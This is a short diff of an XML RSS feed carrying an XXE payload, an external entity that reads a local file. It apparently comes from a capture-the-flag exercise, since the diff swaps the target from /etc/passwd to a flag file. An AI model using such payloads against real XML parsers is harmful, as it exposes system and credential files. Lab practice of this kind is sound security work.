@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd"
+<!ENTITY xxe SYSTEM "file:///flag_7154fc89aaa1215fbc9dc564ff70e662"
  >]>
  <rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
